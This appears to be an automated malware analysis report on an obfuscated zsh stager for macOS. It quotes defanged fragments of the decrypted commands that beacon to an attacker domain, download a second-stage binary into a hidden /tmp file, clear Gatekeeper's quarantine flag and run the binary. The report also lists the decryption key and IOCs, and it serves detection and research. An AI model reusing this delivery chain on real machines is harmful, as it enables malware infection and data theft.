---
title: "Malware Analysis: macOS infostealer stager (unattributed) (other · zsh · b27ed709)"
published: 2026-11-09
draft: false
description: "Malicious (low confidence): macOS infostealer stager (unattributed) · loader/downloader · difficulty easy · Pure static analysis"
tags: ["macOS infostealer", "loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-09-macOS-infostealer-stager-unattributed-b27ed709"
---

> [!WARNING]
> **Verdict: Malicious** · Family **macOS infostealer stager (unattributed)** (uncertain) · Confidence **low**
> 
> Aliases: AMOS / Atomic macOS Stealer delivery (candidate), MacSync / Banshee-style macOS loader (candidate)
> 
> The sample is a zsh dropper wrapped in two layers of AES-128-CTR + gzip. After offline decryption its full logic is directly readable: it sends paste/delivery telemetry back to maplemesh9[.]com, downloads a second-stage Mach-O from quill-95[.]com into a hidden file under /tmp, strips the macOS quarantine flag with xattr -c, and executes it immediately after chmod +x. This combination is a typical macOS malware delivery chain; no legitimate software would self-update using random domains, hidden temporary files and quarantine-attribute removal.

## Overview

| Item | Content |
|:--|:--|
| Family | **macOS infostealer stager (unattributed)** · aliases AMOS / Atomic macOS Stealer delivery (candidate), MacSync / Banshee-style macOS loader (candidate) · _uncertain_ |
| Confidence | **low** |
| Behavior class | loader · downloader |
| Difficulty | easy |
| First seen | 2026-11-06 16:27:20 |
| Analysis method | Pure static analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/b27ed7098a0a1bdd78b4bbf03dff9a69e90f341b1930ab9330687813b990257b/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Decrypt bundled configuration</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Send delivery telemetry</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Download second-stage payload</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Stage in hidden file</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1564.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Remove quarantine attribute</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1553.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `b27ed7098a0a1bdd78b4bbf03dff9a69e90f341b1930ab9330687813b990257b` |
| MD5 | _not recorded_ |
| Size | 2,690 bytes (2.6 KB) |
| Type | other · `zsh` |

## Behavior analysis

**8** behaviors in total, each backed by evidence, and all are statically available.

### 1. Decrypts bundled configuration

`T1027` · Confidence **high** · static

It concatenates five hex constants (_schema_id/_build_tag/_license_salt/_cache_seed/_feature_flags), restores them with xxd -r -p, decrypts with AES-128-CTR (IV=0) using MD5(385) as the key, gunzips, and finally executes via eval.

> **Evidence**: original file offset 2399-2679: _blob=(...); _k=$(printf '%s' "$_kb" | md5); openssl enc -d -aes-128-ctr -K "$_k" -iv 0; gunzip; eval "$_r"
> 
> **Source**: `ref:0c0295c59a` · `ref:55f89546ba`

### 2. Sends delivery telemetry

`T1071.001` · Confidence **high** · static

Immediately after starting, the script sends a POST with curl to /api/metrics/run?event=pasted on maplemesh9[.]com, carrying the user and BuildID activity-identifier headers, to track whether delivery succeeded — beacon-like C2 behavior.

> **Evidence**: decrypted stage one (sha256 889521c4...c58e): curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST -H 'user: AgLa...' -H 'BuildID: AgJt...' hxxps://maplemesh9[.]com/api/metrics/run?event=pasted
> 
> **Source**: `ref:55f89546ba`

### 3. Downloads second-stage payload

`T1105` · Confidence **high** · static

It uses curl -fsSL to download a second-stage Mach-O from a random path on quill-95[.]com into a temporary file, and only continues with the following steps after the download succeeds.

> **Evidence**: decrypted stage one: curl -fsSL -o /tmp/.l22o07b.$$ hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv && mv ...
> 
> **Source**: `ref:55f89546ba`

### 4. Stages in hidden file

`T1564.001` · Confidence **high** · static

It writes the payload as /tmp/.l22o07b.$$ (a hidden dotfile with the PID) and then renames it to /tmp/.l22o07b, avoiding an conspicuous file name and bypassing simple alerting rules.

> **Evidence**: decrypted stage one: j68kpq=/tmp/.l22o07b.$$ ; huwtxe=/tmp/.l22o07b ; mv ${j68kpq} ${huwtxe}
> 
> **Source**: `ref:55f89546ba`

### 5. Removes quarantine attribute

`T1553.001` · Confidence **high** · static

It runs xattr -c to clear the com.apple.quarantine extended attribute from the downloaded file, bypassing macOS Gatekeeper's first-run block on downloaded programs.

> **Evidence**: decrypted stage one: gqmoi=$(printf octal escapes) decodes to xattr ; ${gqmoi} -c ${huwtxe}
> 
> **Source**: `ref:55f89546ba`

### 6. Grants execute permission

`T1222.002` · Confidence **high** · static

It runs chmod +x on the downloaded temporary file, making it an executable.

> **Evidence**: decrypted stage one: bhgh3=$(printf octal escapes) decodes to chmod ; ${bhgh3} +x ${huwtxe}
> 
> **Source**: `ref:55f89546ba`

### 7. Executes downloaded payload

`T1059.004` · Confidence **high** · static

After download, de-quarantine and permission setting all complete, it directly invokes /tmp/.l22o07b to run the second-stage program; before execution it sends telemetry again with event=stager.

> **Evidence**: last line of decrypted stage one: ... && { curl ... event=stager & } && ${huwtxe}
> 
> **Source**: `ref:55f89546ba`

### 8. Masquerades as maintenance script

`T1036` · Confidence **medium** · static

It defines many harmless-looking log strings such as _log/init complete/nothing to prune/state saved and variables such as _pager/_color/_version, and uses log-component and probe-configuration naming to obfuscate its real purpose.

> **Evidence**: original file offset 30-1120: _log function, 'init complete', 'nothing to prune', _pager=more, _color=auto, _version=v6.0.4; the decrypted stage also keeps _log and dev/null variables
> 
> **Source**: `ref:0c0295c59a` · `ref:55f89546ba`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; under the analysis environment's network isolation no successful connection or session was observed, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 443 | download | static | ⏳ not observed |
| http | `hxxps://maplemesh9[.]com/api/metrics/run?event=pasted` | 443 | panel | static | ⏳ not observed |
| http | `hxxps://maplemesh9[.]com/api/metrics/run?event=stager` | 443 | panel | static | ⏳ not observed |

### Host

**Dropped paths**

- `/tmp/.l22o07b.$$`
- `/tmp/.l22o07b`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `quill-95[.]com, maplemesh9[.]com` | yes | static |
| `download_url` | `hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | yes | static |
| `telemetry_url` | `hxxps://maplemesh9[.]com/api/metrics/run?event=pasted ; hxxps://maplemesh9[.]com/api/metrics/run?event=stager` | yes | static |
| `http_header_user` | `AgLa7s9n3uFA-V1OVpdHKxs28kZraGwl1HqYXCp1qMBBtg7-mfho (pasted) / AgLamIZ4Ojni6AWsJfu7A5IH165mzshBCVSLGpHFOlSMp9vauwCx (stager)` | yes | static |
| `http_header_buildid` | `AgJt3GXjbJAMxdvNno45OnW2iP8ggXdBu7O5qUTWTLC5hoE (pasted) / AgIFS62a5679cmW6eOVFScqH2TKpBiQBADgeEheb0LpU5aM (stager)` | yes | static |
| `staging_path` | `/tmp/.l22o07b.$$ -> /tmp/.l22o07b` | yes | static |
| `encryption_algo` | `AES-128-CTR (key=MD5(385), zero IV) then gzip; payload evaluated with eval` | yes | static |
| `key_derivation` | `_kb = 2*157 + 2%69 + 69 = 385; key = md5('385') = dc912a253d1e9ba40e2c597ed2376640` | yes | static |

## Must not be misjudged

:::important
The following conclusions are **easy to misjudge**; keep them in mind when citing this report.

- Do not claim that the second-stage Mach-O payload was downloaded, run or analyzed — this run only recovered the stage-one script and did not obtain the second-stage file.
- Do not assert that the sample belongs to a specific family such as AMOS/Atomic Stealer, MacSync or Banshee — the second stage and family-specific markers are missing.
- Do not claim that the C2 came online or that telemetry was successfully sent — the whole run was offline, and the URLs were only statically recovered from the script.
- Do not claim that this script can run directly on Windows — it relies on zsh and xattr semantics and targets macOS.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Pure static analysis |
| Unpacking | Yes (stage2 `889521c4ec216e477e3813836630f297e401f34ce6f4f169f52279153ca0c58e`) |

**Limitations and pending verification**

1. No isolated dynamic channel is available for this format, and the rules forbid executing the sample on the host, so the whole run was static analysis with reproduced=false.
2. The network is off by default and quill-95[.]com / maplemesh9[.]com were not contacted, so the second-stage payload and the C2's actual responses are unavailable.
3. The missing second stage makes it impossible to confirm the final payload type (stealer/backdoor) and the concrete family attribution.
4. The generation rules and campaign mapping of the telemetry headers user/BuildID are unknown; they can only be recorded as activity identifiers.
5. xattr -c targets the macOS quarantine attribute; the script cannot run with its original semantics in a non-macOS environment.

## Evidence index

<details>
<summary>Expand 2 tool evidence items</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | static string extraction: 41 ASCII strings, locating the encrypted constants, the md5/xxd/openssl/gunzip fragments and the eval pipeline (offset 0-2679). |
| `ev-000002` | evidence.record | offline decryption recreation: MD5(385) is the AES-128-CTR key, yielding a 1,686-byte stage-one zsh (sha256 889521c4...c58e) containing the quill-95[.]com download URL, the maplemesh9[.]com telemetry URLs, the /tmp/.l22o07b staging path, xattr -c, chmod +x and the execution command. |

</details>

---

_This report's sample is not public, and IOCs are defanged; for security research only._
